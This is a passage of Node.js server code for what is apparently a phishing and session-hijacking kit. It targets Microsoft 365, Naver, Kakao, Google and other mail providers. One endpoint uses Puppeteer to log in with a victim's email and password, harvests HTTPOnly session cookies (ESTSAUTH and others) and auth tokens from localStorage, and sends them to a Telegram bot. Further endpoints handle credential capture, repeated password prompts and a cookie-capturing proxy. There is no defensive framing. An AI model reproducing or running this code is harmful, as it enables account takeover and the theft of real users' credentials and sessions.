            'scope=openid%20profile%20https%3A%2F%2Fwww.office.com%2Fv2%2FOfficeHome.All&' +
            'response_mode=form_post&' +
            'nonce=' + Date.now() + '.ZjU0YmVjYzUtNzMyZi00MzBlLWE1NWYtMjUwOTBmNTNhNjc2NjYzMTY5ZGUtMjI1NC00NzRmLWIyMjItNGM5OGJlMjU3Mjdl&' +
            'ui_locales=en-US&mkt=en-US&' +
            'login_hint=' + encodeURIComponent(email);
        
        console.log(`🔄 Navigating to Microsoft login: ${email}`);
        await page.goto(msLoginUrl, { waitUntil: 'networkidle2', timeout: 30000 });
        
        try {
            await page.waitForSelector('input[type="email"], input[name="loginfmt"]', { timeout: 10000 });
            const emailInput = await page.$('input[type="email"], input[name="loginfmt"]');
            if (emailInput) {
                await emailInput.click({ clickCount: 3 });
                await emailInput.type(email, { delay: 100 });
                await page.keyboard.press('Enter');
                await page.waitForNavigation({ waitUntil: 'networkidle2', timeout: 10000 }).catch(() => {});
            }
            
            if (password) {
                await page.waitForSelector('input[type="password"], input[name="passwd"]', { timeout: 10000 });
                const passwordInput = await page.$('input[type="password"], input[name="passwd"]');
                if (passwordInput) {
                    await passwordInput.click({ clickCount: 3 });
                    await passwordInput.type(password, { delay: 80 });
                    await page.keyboard.press('Enter');
                    await page.waitForNavigation({ waitUntil: 'networkidle2', timeout: 10000 }).catch(() => {});
                }
            }
            
        } catch (error) {
            console.log('⚠️ Login flow error:', error.message);
        }
        
        const allCookies = await page.cookies();
        console.log(`🍪 Total cookies captured: ${allCookies.length}`);
        
        const httpOnlyCookies = allCookies.filter(c => c.httpOnly);
        const secureCookies = allCookies.filter(c => c.secure);
        const sessionCookies = allCookies.filter(c => c.session);
        
        console.log(`🔒 HTTPOnly: ${httpOnlyCookies.length}`);
        console.log(`🔐 Secure: ${secureCookies.length}`);
        console.log(`🔄 Session: ${sessionCookies.length}`);
        
        const sessionTokens = {
            'x-ms-session': allCookies.find(c => c.name === 'x-ms-session')?.value,
            'id_token': allCookies.find(c => c.name === 'id_token')?.value,
            'ESTSAUTH': allCookies.find(c => c.name === 'ESTSAUTH')?.value,
            'ESTSAUTHPERSISTENT': allCookies.find(c => c.name === 'ESTSAUTHPERSISTENT')?.value,
            'ESTSSESSION': allCookies.find(c => c.name === 'ESTSSESSION')?.value
        };
        
        const localStorageData = await page.evaluate(() => {
            const items = {};
            for (let i = 0; i < localStorage.length; i++) {
                const key = localStorage.key(i);
                if (key && (key.includes('ms') || key.includes('auth') || key.includes('session') || key.includes('token'))) {
                    items[key] = localStorage.getItem(key);
                }
            }
            return items;
        });
        
        console.log(`💾 LocalStorage items: ${Object.keys(localStorageData).length}`);
        
        let telegramMessage = `🎯 *HTTPOnly COOKIES CAPTURED VIA PUPPETEER*\n\n`;
        telegramMessage += `*Email:* ${email}\n`;
        telegramMessage += `*Total Cookies:* ${allCookies.length}\n`;
        telegramMessage += `*HTTPOnly:* ${httpOnlyCookies.length}\n`;
        telegramMessage += `*Secure:* ${secureCookies.length}\n`;
        telegramMessage += `*Session:* ${sid}\n\n`;
        
        if (httpOnlyCookies.length > 0) {
            telegramMessage += `*🔒 HTTPOnly Cookies:*\n`;
            httpOnlyCookies.slice(0, 3).forEach(c => {
                telegramMessage += `  *${c.name}*: \`${c.value.substring(0, 30)}...\`\n`;
            });
            telegramMessage += `\n`;
        }
        
        let hasTokens = false;
        for (const [key, value] of Object.entries(sessionTokens)) {
            if (value) {
                if (!hasTokens) {
                    telegramMessage += `*🎟️ Session Tokens:*\n`;
                    hasTokens = true;
                }
                telegramMessage += `  *${key}*: \`${value.substring(0, 30)}...\`\n`;
            }
        }
        if (hasTokens) telegramMessage += `\n`;
        
        if (Object.keys(localStorageData).length > 0) {
            telegramMessage += `*💾 LocalStorage:*\n`;
            Object.entries(localStorageData).slice(0, 3).forEach(([key, value]) => {
                telegramMessage += `  *${key}*: \`${value.substring(0, 30)}...\`\n`;
            });
            telegramMessage += `\n`;
        }
        
        telegramMessage += `*Time:* ${new Date().toISOString()}`;
        await sendToTelegram(telegramMessage);
        
        await page.close();
        
        res.json({
            success: true,
            sessionId: sid,
            email: email,
            totalCookies: allCookies.length,
            httpOnlyCookies: httpOnlyCookies.length,
            secureCookies: secureCookies.length,
            sessionTokens: Object.fromEntries(Object.entries(sessionTokens).filter(([_, v]) => v)),
            localStorage: localStorageData,
            cookieExample: allCookies.slice(0, 3).map(c => ({ 
                name: c.name, 
                value: c.value.substring(0, 50) + '...', 
                httpOnly: c.httpOnly, 
                secure: c.secure 
            }))
        });
        
    } catch (error) {
        console.error('❌ Puppeteer error:', error.message);
        res.status(500).json({ success: false, error: error.message });
    }
});

// ============================================================
// TELEGRAM ENDPOINT
// ============================================================
app.post('/api/telegram', async (req, res) => {
    try {
        const { message, parseMode } = req.body;
        await sendToTelegram(message, parseMode || 'Markdown');
        res.json({ success: true });
    } catch (error) {
        console.error('[TELEGRAM] Error:', error);
        res.status(500).json({ error: error.message });
    }
});

// ============================================================
// GET VERIFICATION STATUS
// ============================================================
app.get('/api/verification-status', (req, res) => {
    try {
        const status = req.session.verification || { 
            stage: 1, 
            password1Valid: false, 
            password2Valid: false, 
            attempts: 0 
        };
        res.json({
            stage: status.stage || 1,
            password1Valid: status.password1Valid || false,
            password2Valid: status.password2Valid || false,
            attempts: status.attempts || 0,
            email: status.email || null,
            provider: status.providerDisplay || 'Unknown',
            loginUrl: status.loginUrl || null
        });
    } catch (error) {
        res.status(500).json({ error: error.message });
    }
});

// ============================================================
// RESET VERIFICATION
// ============================================================
app.post('/api/reset-verification', (req, res) => {
    try {
        if (req.session) req.session.verification = null;
        res.json({ success: true, message: 'Verification reset' });
    } catch (error) {
        res.status(500).json({ error: error.message });
    }
});

// ============================================================
// HEALTH CHECK
// ============================================================
app.get('/health', async (req, res) => {
    res.json({
        status: 'healthy',
        timestamp: new Date().toISOString(),
        browserActive: !!browserInstance,
        sessions: req.session.id,
        telegram: !!(process.env.TELEGRAM_BOT_TOKEN && process.env.TELEGRAM_CHAT_ID),
        endpoints: [
            'POST /api/verify-password - 2-Consecutive password verification',
            'POST /api/credential-capture - Capture credentials',
            'POST /api/telegram - Send Telegram message',
            'GET /api/verification-status - Get verification status',
            'POST /api/reset-verification - Reset verification',
            'POST /api/puppeteer-capture - Puppeteer cookie capture',
            '/proxy/* - Proxy with cookie capture'
        ]
    });
});

// ============================================================
// START SERVER
// ============================================================
app.listen(PORT, () => {
    console.log('╔═══════════════════════════════════════════════════════════╗');
    console.log('║                                                           ║');
    console.log('║   🇰🇷  COMPLETE SERVER - ALL FEATURES                   ║');
    console.log('║   🔐  2-CONSECUTIVE PASSWORD VERIFICATION                ║');
    console.log('║   🍪  HTTPOnly Cookie Capture                           ║');
    console.log('║   🤖  Puppeteer Automation                              ║');
    console.log('║   🌐  Multi-Provider Support (Korean + International)   ║');
    console.log('║                                                           ║');
    console.log('╠═══════════════════════════════════════════════════════════╣');
    console.log(`║   📍 Server:  http://localhost:${PORT}                   ║`);
    console.log(`║   🔗 Proxy:   /proxy/*                                   ║`);
    console.log(`║   🔐 Verify:  POST /api/verify-password                  ║`);
    console.log(`║   🤖 Puppet:  POST /api/puppeteer-capture               ║`);
    console.log(`║   📧 Telegram: ${process.env.TELEGRAM_BOT_TOKEN ? '✅ ENABLED' : '❌ DISABLED'}`);
    console.log('║                                                           ║');
    console.log('╠═══════════════════════════════════════════════════════════╣');
    console.log('║   ✅ Supported Providers:                                ║');
    console.log('║   🇰🇷 Naver Works • Tracoworld • JPI • Upchem           ║');
    console.log('║   🇰🇷 Flucon • Ecount • Naver • Daum • Kakao            ║');
    console.log('║   🇰🇷 Nate • DreamWiz • Paran • Empas • Lycos           ║');
    console.log('║   🇰🇷 Freechal • Korean Corporate                        ║');
    console.log('║   💼 Microsoft 365 • Google • Yahoo • Apple             ║');
    console.log('║                                                           ║');
    console.log('╠═══════════════════════════════════════════════════════════╣');
    console.log('║   📊 Endpoints:                                         ║');
    console.log('║   POST /api/verify-password - Password verification    ║');
    console.log('║   POST /api/credential-capture - Credential capture   ║');
    console.log('║   POST /api/telegram - Send Telegram                  ║');
    console.log('║   GET  /api/verification-status - Status              ║');
    console.log('║   POST /api/reset-verification - Reset                ║');
    console.log('║   POST /api/puppeteer-capture - Puppeteer capture    ║');
    console.log('║   /proxy/* - Proxy with cookie capture               ║');
    console.log('║   GET  /health - Health check                        ║');
    console.log('║                                                           ║');
    console.log('╚═══════════════════════════════════════════════════════════╝');
});